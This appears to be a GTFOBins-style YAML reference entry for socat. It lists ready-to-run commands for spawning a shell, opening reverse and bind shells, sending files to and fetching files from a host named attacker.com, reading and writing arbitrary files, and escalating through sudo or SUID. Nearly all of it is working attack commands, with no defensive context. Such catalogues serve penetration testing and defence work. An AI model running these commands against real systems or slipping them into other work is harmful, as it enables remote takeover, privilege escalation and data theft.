---
functions:
  shell:
    - description: The resulting shell is not a proper TTY shell and lacks the prompt.
      code: |
        socat stdin exec:/bin/sh
  reverse-shell:
    - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
  bind-shell:
    - description: Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell.
      code: |
        LPORT=12345
        socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
  file-upload:
    - description: Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
  file-download:
    - description: Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_save
        socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
  file-read:
    - code: |
        LFILE=file_to_read
        socat -u "file:$LFILE" -
  file-write:
    - code: |
        LFILE=file_to_write
        socat -u 'exec:echo DATA' "open:$LFILE,creat"
  sudo:
    - description: The resulting shell is not a proper TTY shell and lacks the prompt.
      code: |
        sudo socat stdin exec:/bin/sh
  limited-suid:
    - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        ./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
---
